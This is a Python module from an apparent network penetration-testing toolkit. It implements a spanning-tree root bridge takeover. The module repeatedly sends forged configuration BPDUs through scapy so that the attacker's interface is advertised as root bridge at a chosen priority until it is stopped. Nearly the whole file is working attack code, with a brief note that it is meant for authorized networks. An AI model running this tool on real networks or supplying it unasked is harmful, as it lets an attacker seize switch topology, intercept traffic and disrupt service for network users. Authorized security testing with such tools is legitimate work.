"""Root bridge takeover: keep a bridge ID advertised as the spanning-tree root.

Spanning Tree elects the bridge with the lowest bridge ID as root. A device that
advertises its own bridge ID with a better priority than the current root becomes
root, and it keeps that role for as long as it keeps sending configuration BPDUs.
Unlike a single injected BPDU, the claim has to be refreshed at the hello interval,
which is what makes it a takeover rather than a one-time disturbance.

This module sends that refreshed claim: the root ID and the bridge ID are the
attacker's own, at the given priority. It reuses the BPDU layout from
bpdu_spoofing. It does not listen for a rival root, so it does not back off when a
better root appears.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.bpdu_spoofing import HELLO_TIME, build_bpdu_frame, validate_priority
from macabre.attacks.common import Runner, read_interface_mac, run_command

HELLO_SECONDS = HELLO_TIME / 256


@dataclass(frozen=True)
class RootBridgeTakeoverConfig:
    iface: str                          # attacker interface, on the switch port under test
    priority: int = 0                   # bridge priority claimed as root (lower wins)
    count: int = 0                      # BPDUs to send; 0 = keep the claim until stopped
    interval: float = HELLO_SECONDS     # refresh interval; 2 s is the standard hello time
    dry_run: bool = False               # build BPDUs but do not send them

    def __post_init__(self) -> None:
        validate_priority(self.priority, "Priority")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval <= 0:
            raise ValueError("Interval must be positive, or the claim expires.")


@dataclass
class RootBridgeTakeoverStats:
    sender_mac: str = ""
    root_id: str = ""
    frames: int = 0
    status: str = ""


def run_root_bridge_takeover(
    config: RootBridgeTakeoverConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RootBridgeTakeoverStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> RootBridgeTakeoverStats:
    """Advertise this interface's bridge as root until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = RootBridgeTakeoverStats(
            status=(
                f"Dry run: would advertise a root with priority {config.priority} from this bridge "
                f"every {config.interval:g} s. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = RootBridgeTakeoverStats(
        sender_mac=sender_mac,
        root_id=f"{config.priority:04x}.{sender_mac}",
    )
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_bpdu_frame(
            sender_mac,
            root_priority=config.priority,
            root_mac=sender_mac,
            bridge_priority=config.priority,
        )
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
